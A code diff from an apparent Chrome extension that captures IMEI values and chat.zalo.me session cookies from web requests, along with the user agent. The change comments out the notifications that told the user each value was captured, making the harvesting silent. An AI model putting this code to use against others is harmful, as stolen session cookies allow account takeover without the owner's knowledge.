@@ -12,13 +12,13 @@ function captureRequests() {
 
         chrome.runtime.sendMessage({ action: "IMEIValue", imei: imeiValue });
 
-        let notificationOptions = {
-          type: "basic",
-          title: "IMEI Found",
-          message: "Successfully get IMEI",
-          iconUrl: "/images/success.png",
-        };
-        chrome.notifications.create(notificationOptions);
+        // let notificationOptions = {
+        //   type: "basic",
+        //   title: "IMEI Found",
+        //   message: "Successfully get IMEI",
+        //   iconUrl: "/images/success.png",
+        // };
+        // chrome.notifications.create(notificationOptions);
       }
 
       // If IMEI is found and URL is chat.zalo.me, get cookies
@@ -38,13 +38,13 @@ function captureRequests() {
             cookies: cookieString,
           });
 
-          let notificationOptions = {
-            type: "basic",
-            title: "Cookies Found",
-            message: "Successfully get Cookies",
-            iconUrl: "/images/success.png",
-          };
-          chrome.notifications.create(notificationOptions);
+          // let notificationOptions = {
+          //   type: "basic",
+          //   title: "Cookies Found",
+          //   message: "Successfully get Cookies",
+          //   iconUrl: "/images/success.png",
+          // };
+          // chrome.notifications.create(notificationOptions);
         });
       }
 
@@ -52,13 +52,13 @@ function captureRequests() {
       let userAgent = navigator.userAgent;
       chrome.runtime.sendMessage({ action: "UserAgent", useragent: userAgent });
 
-      let notificationOptions = {
-        type: "basic",
-        title: "User-Agent Found",
-        message: "Successfully get User-Agent",
-        iconUrl: "/images/success.png",
-      };
-      chrome.notifications.create(notificationOptions);
+      // let notificationOptions = {
+      //   type: "basic",
+      //   title: "User-Agent Found",
+      //   message: "Successfully get User-Agent",
+      //   iconUrl: "/images/success.png",
+      // };
+      // chrome.notifications.create(notificationOptions);
     },
     { urls: ["<all_urls>"] },
     ["requestBody"]
